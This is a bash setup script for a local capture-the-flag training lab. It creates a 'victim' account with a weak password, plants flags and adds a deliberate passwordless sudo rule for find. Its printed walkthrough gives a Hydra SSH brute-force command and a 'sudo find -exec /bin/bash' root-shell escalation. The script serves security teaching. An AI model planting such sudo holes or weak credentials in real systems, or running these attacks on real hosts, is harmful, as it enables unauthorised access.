#!/bin/bash

echo "======================================="
echo "     AyedCTF Hydra Lab - Setup Script"
echo "======================================="

# 1) Create vulnerable user
echo "[+] Creating vulnerable user: victim"
sudo userdel -r victim 2>/dev/null
sudo adduser --disabled-password --gecos "" victim
echo "victim:coffee123" | sudo chpasswd

# 2) Create USER FLAG
echo "[+] Creating user flag"
sudo bash -c 'echo "ayedCTF{ssh_bruteforce_success}" > /home/victim/user.txt'
sudo chmod 400 /home/victim/user.txt
sudo chown victim:victim /home/victim/user.txt

# 3) Create ROOT FLAG
echo "[+] Creating root flag"
sudo bash -c 'echo "ayedCTF{root_privesc_master}" > /root/root.txt'
sudo chmod 400 /root/root.txt

# 4) Sudo misconfiguration (Privilege Escalation)
echo "[+] Adding sudo misconfiguration (victim can run find as root)"
echo "victim ALL=(root) NOPASSWD: /usr/bin/find" | sudo tee /etc/sudoers.d/victim > /dev/null

# 5) Start SSH service
echo "[+] Enabling SSH service"
sudo systemctl enable ssh
sudo systemctl start ssh

# 6) Create attacking wordlist
echo "[+] Creating example wordlist (pass.txt)"
cat <<EOF > pass.txt
admin
password
123456
toor
coffee123
111111
EOF

# 7) Display final instructions
echo "======================================="
echo "     Lab Setup Completed Successfully!"
echo "=======================================

HOW TO USE THE LAB:

1) List local users:
   cat /etc/passwd | grep /home

2) Run Hydra brute-force attack:
   hydra -l victim -P pass.txt ssh://localhost -t 4 -vV

3) SSH into the victim user:
   ssh victim@localhost
   (Password is cracked by Hydra)

4) Capture USER FLAG:
   cat /home/victim/user.txt

5) Check for PrivEsc vector:
   sudo -l

6) Exploit for root shell:
   sudo find . -exec /bin/bash \\;

7) Capture ROOT FLAG:
   cat /root/root.txt

Enjoy the AyedCTF Hydra Lab!
======================================="

exit 0
